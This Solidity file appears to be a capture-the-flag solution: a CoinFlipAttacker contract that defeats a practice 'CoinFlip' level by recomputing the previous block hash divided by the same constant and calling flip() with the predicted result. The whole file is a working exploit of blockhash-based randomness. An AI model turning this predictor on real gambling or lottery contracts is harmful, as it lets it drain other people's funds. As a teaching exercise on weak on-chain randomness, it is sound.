// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/3-CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip public coinFlipContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (CoinFlip _coinFlipContract) {
        coinFlipContract = _coinFlipContract;
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}